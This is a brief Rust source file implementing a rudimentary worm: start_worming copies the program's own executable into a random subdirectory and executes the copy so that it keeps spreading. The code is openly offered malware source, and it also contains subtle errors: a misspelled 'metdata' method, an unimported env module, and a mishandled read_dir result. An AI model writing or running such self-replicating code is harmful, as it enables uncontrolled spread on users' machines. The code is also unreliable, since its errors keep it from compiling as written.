use std::fs;
use std::io;
use std::path::{Path,PathBuf};
use rand::seq::SliceRandom;
use rand::thread_rng;
use std::process::Command;

pub fn list_dirs(path: &Path) -> io::Result<Vec<PathBuf>> {
    let mut dirs = Vec::new();
    for entry in fs::read_dir(path){
        let entry = entry?;
        let metadata = entry.metdata()?;
        if metadata.is_dir(){
            dirs.push(entry.path());
        }
    }
    Ok(dirs)
}

pub fn start_worming() -> io::Result<()>{
    let current_dir = Path::new("."); //this gives the current directory
    let directories = list_dirs(current_dir)?;

    if let Some(random_dir) = directories.choose(&mut thread_rng()) {
        let exe_path = env::current_exe()?;
        let exe_name = exe_path.file_name().unwrap();
        let new_path = random_dir.join(exe_name);
        fs::copy(&exe_path,&new_path)?;
        let arg1 = "-start_worm";
        let _ = Command::new(new_path)
        .arg(arg1)
        .output()
        .expect("Failed to start the worm further");
    }
    Ok(())

}